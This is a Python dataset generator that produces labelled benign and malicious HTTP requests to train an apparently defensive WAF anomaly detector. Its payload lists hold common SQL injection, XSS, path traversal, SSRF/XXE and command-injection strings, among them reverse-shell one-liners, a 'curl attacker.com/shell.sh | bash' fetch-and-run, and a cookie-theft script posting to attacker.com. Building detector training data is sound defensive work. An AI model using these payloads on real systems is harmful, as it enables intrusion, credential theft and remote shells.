"""
Synthetic & Labeled Training Dataset Generator for WAF Anomaly Detector.

Generates realistic benign HTTP traffic (DVWA/Juice Shop style normal requests)
and comprehensive malicious attack payloads (SQLi, XSS, Path Traversal, CMDi, SSRF/XXE, Scanners).
"""

import random
from typing import Dict, List, Tuple

# Realistic Benign Paths & Patterns
BENIGN_PATHS = [
    "/", "/index.php", "/home", "/about", "/contact", "/products",
    "/products/detail", "/cart", "/checkout", "/login", "/register",
    "/profile", "/settings", "/dashboard", "/api/v1/items",
    "/api/v1/user/status", "/search", "/blog", "/posts/2026/security-guide",
    "/static/css/style.css", "/static/js/app.js", "/assets/images/logo.png",
    "/favicon.ico", "/rest/basket/view", "/rest/user/whoami"
]

BENIGN_PARAMS = [
    {"q": "laptop"},
    {"search": "wireless noise cancelling headphones"},
    {"category": "electronics", "page": "2", "sort": "price_asc"},
    {"filter": "in_stock", "brand": "sony", "rating": "4"},
    {"username": "johndoe", "remember": "1"},
    {"id": "42"},
    {"page": "1", "limit": "20"},
    {"theme": "dark", "lang": "en-US"},
    {"ref": "google_search", "utm_source": "newsletter"},
    {"email": "support@example.org", "subject": "Question regarding shipment"},
    {"view": "grid", "offset": "40"},
    {"action": "download", "file": "annual_report_2025.pdf"},
    {"token": "a1b2c3d4e5f67890abcdef1234567890"},
    {"lat": "37.7749", "lon": "-122.4194", "radius": "10km"},
    {"comment": "Great product! Works as expected and shipped quickly."},
    {"name": "Alice Smith", "city": "San Francisco", "zip": "94102"},
]

BENIGN_BODIES = [
    '{"name": "Alex", "email": "alex@company.com", "role": "analyst"}',
    '{"productId": 105, "quantity": 2, "coupon": "SUMMER2026"}',
    '{"query": "machine learning security", "filters": {"author": "admin"}}',
    'username=alice&password=SecurePassword2026!&csrf=8a7df6b5c4',
    'title=Meeting+Agenda&description=Review+Q3+deliverables+and+timelines',
    'address=100+Market+St&city=San+Francisco&state=CA&country=USA',
    'rating=5&feedback=Excellent+customer+support+team!',
    '{"status": "active", "tags": ["waf", "python", "networking"]}',
    '{"id": 992, "timestamp": 1788809573, "read": true}',
    'firstName=Dev&lastName=Patel&phone=%2B14155552671'
]

BENIGN_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
]

# Curated High-Impact Malicious Attack Payloads
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "' OR 1=1 #",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' or 1=1 or ''='",
    "\" or 1=1 --",
    "1' UNION SELECT null, username, password FROM users--",
    "1' UNION ALL SELECT 1,2,3,table_name FROM information_schema.tables--",
    "1 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users'--",
    "-1 UNION SELECT 1, version(), user(), database()--",
    "1'; DROP TABLE users;--",
    "1; EXEC xp_cmdshell('whoami')--",
    "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
    "1 AND SLEEP(5)--",
    "1' WAITFOR DELAY '0:0:5'--",
    "1' AND pg_sleep(5)--",
    "1 AND (SELECT 1 FROM DUAL WHERE 1=1)",
    "1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT user())))",
    "1' AND UPDATEXML(1, CONCAT(0x2e, @@version), 1)--",
    "1' ORDER BY 10--",
    "1' ORDER BY 1#",
    "' UNION/**/SELECT/**/1,2,3--",
    "%27%20OR%201%3D1--",
    "%2527%2520OR%2520%25271%2527%253D%25271",
    "admin') OR ('1'='1",
    "1' OR true--",
    "1' AND 'a'='a",
    "1 AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<script src=\"http://attacker.com/evil.js\"></script>",
    "<img src=x onerror=alert(document.cookie)>",
    "<img src=\"javascript:alert(1);\">",
    "<svg onload=alert(1)>",
    "<svg/onload=confirm('Hacked')>",
    "<body onload=alert(1)>",
    "<iframe src=\"javascript:alert(1)\"></iframe>",
    "<a href=\"javascript:alert(1)\">Click me</a>",
    "javascript:alert(document.domain)",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "'\"><script>alert(1)</script>",
    "\"><img src=x onerror=prompt(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<video><source onerror=\"javascript:alert(1)\">",
    "<sCrIpt>alert(1)</sCrIpt>",
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
    "<style>body{background-image:url('javascript:alert(1)')}</style>",
    "';alert(String.fromCharCode(88,83,83))//",
    "document.location='http://attacker.com/steal?c='+document.cookie",
]

TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../../windows/win.ini",
    "../../../../windows/system32/drivers/etc/hosts",
    "../../../../boot.ini",
    "..\\..\\..\\..\\windows\\system32\\cmd.exe",
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%5c..%5c..%5cwindows%5cwin.ini",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    "....//....//....//etc/passwd",
    "../../../../etc/passwd%00.jpg",
    "/var/www/images/../../../../etc/passwd",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/version",
    "/etc/issue",
    "../../../../var/log/apache2/access.log",
]

CMDI_PAYLOADS = [
    "; cat /etc/passwd",
    "; whoami",
    "| whoami",
    "& whoami",
    "&& whoami",
    "|| whoami",
    "; id",
    "| id",
    "$(whoami)",
    "$(id)",
    "`whoami`",
    "`id`",
    "; uname -a",
    "| uname -a",
    "& dir",
    "&& dir C:\\",
    "; ping -c 4 127.0.0.1",
    "| nc -e /bin/sh 10.0.0.1 4444",
    "; bash -i >& /dev/tcp/10.0.0.1/8080 0>&1",
    "; curl http://attacker.com/shell.sh | bash",
    "| powershell -Command \"Invoke-WebRequest -Uri http://attacker.com/payload.ps1\"",
    "; rm -rf /tmp/test",
]

SSRF_XXE_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://127.0.0.1:8080/admin",
    "http://localhost:22",
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "gopher://127.0.0.1:6379/_flushall",
    "dict://127.0.0.1:11211/stat",
    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
    "<!DOCTYPE test [ <!ENTITY % init SYSTEM \"data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk\"> %init; ]>",
]

SCANNER_USER_AGENTS = [
    "sqlmap/1.7.2#stable (https://sqlmap.org)",
    "Nikto/2.1.6",
    "Mozilla/5.0 (compatible; OWASP ZAP 2.14.0)",
    "wpscan v3.8.22",
    "gobuster/3.6",
    "dirbuster/1.0",
    "python-requests/2.31.0",
    "curl/7.88.1",
    "Nmap Scripting Engine (https://nmap.org/book/nse.html)",
    "BurpSuite/2023.12",
]


def generate_benign_request() -> Dict:
    """Generate a single realistic benign HTTP request dictionary."""
    path = random.choice(BENIGN_PATHS)
    method = random.choices(["GET", "POST", "PUT"], weights=[0.75, 0.20, 0.05])[0]
    headers = {
        "Host": "lab.internal",
        "User-Agent": random.choice(BENIGN_USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",
    }

    params = {}
    body = ""

    if method == "GET":
        if random.random() < 0.6:
            params = random.choice(BENIGN_PARAMS).copy()
            # Randomly jitter parameter values
            if "id" in params:
                params["id"] = str(random.randint(1, 500))
            if "page" in params:
                params["page"] = str(random.randint(1, 20))
    else:
        # POST/PUT
        if random.random() < 0.5:
            body = random.choice(BENIGN_BODIES)
            headers["Content-Type"] = "application/json" if body.startswith("{") else "application/x-www-form-urlencoded"
        else:
            params = random.choice(BENIGN_PARAMS).copy()

    return {
        "path": path,
        "method": method,
        "params": params,
        "body": body,
        "headers": headers,
        "label": 0,
        "attack_type": "benign"
    }


def generate_malicious_request() -> Dict:
    """Generate a single realistic malicious HTTP attack request dictionary."""
    attack_type = random.choice(["sqli", "xss", "traversal", "cmdi", "ssrf_xxe"])
    method = random.choice(["GET", "POST"])

    if attack_type == "sqli":
        payload = random.choice(SQLI_PAYLOADS)
        path = random.choice(["/login.php", "/vulnerabilities/sqli/", "/products", "/search.php", "/api/user"])
        param_name = random.choice(["id", "user", "username", "query", "cat", "search"])
    elif attack_type == "xss":
        payload = random.choice(XSS_PAYLOADS)
        path = random.choice(["/vulnerabilities/xss_r/", "/search", "/comment", "/guestbook.php", "/profile"])
        param_name = random.choice(["name", "msg", "comment", "q", "redirect_to", "text"])
    elif attack_type == "traversal":
        payload = random.choice(TRAVERSAL_PAYLOADS)
        path = random.choice(["/vulnerabilities/fi/", "/download.php", "/view", "/include.php", "/image"])
        param_name = random.choice(["page", "file", "doc", "path", "template", "view"])
    elif attack_type == "cmdi":
        payload = random.choice(CMDI_PAYLOADS)
        path = random.choice(["/vulnerabilities/exec/", "/ping.php", "/tools/dns", "/backup", "/system"])
        param_name = random.choice(["ip", "host", "target", "cmd", "domain", "address"])
    else:  # ssrf_xxe
        payload = random.choice(SSRF_XXE_PAYLOADS)
        path = random.choice(["/proxy", "/fetch", "/api/webhook", "/upload_xml", "/load_url"])
        param_name = random.choice(["url", "dest", "target", "xml", "feed"])

    # Normal or scanner User-Agent
    use_scanner_ua = random.random() < 0.35
    ua = random.choice(SCANNER_USER_AGENTS) if use_scanner_ua else random.choice(BENIGN_USER_AGENTS)

    headers = {
        "Host": "lab.internal",
        "User-Agent": ua,
        "Accept": "*/*",
    }

    # Decide where attack payload lives: query param, body, or URL path
    location = random.choice(["param", "param", "body", "path"])
    params = {}
    body = ""

    if location == "param":
        params[param_name] = payload
    elif location == "body" and method == "POST":
        if attack_type == "ssrf_xxe" and "<!DOCTYPE" in payload:
            body = payload
            headers["Content-Type"] = "application/xml"
        else:
            body = f"{param_name}={urllib_quote(payload)}&csrf_token=xyz123"
            headers["Content-Type"] = "application/x-www-form-urlencoded"
    else:
        path = f"{path}/{payload}"

    return {
        "path": path,
        "method": method,
        "params": params,
        "body": body,
        "headers": headers,
        "label": 1,
        "attack_type": attack_type
    }


def urllib_quote(s: str) -> str:
    import urllib.parse
    return urllib.parse.quote(s)


def build_dataset(num_samples: int = 4000, benign_ratio: float = 0.5) -> List[Dict]:
    """
    Constructs a balanced labeled dataset of HTTP requests.
    Returns list of request dictionaries with 'label' (0=benign, 1=malicious) and 'attack_type'.
    """
    dataset = []
    num_benign = int(num_samples * benign_ratio)
    num_malicious = num_samples - num_benign

    for _ in range(num_benign):
        dataset.append(generate_benign_request())

    for _ in range(num_malicious):
        dataset.append(generate_malicious_request())

    random.shuffle(dataset)
    return dataset
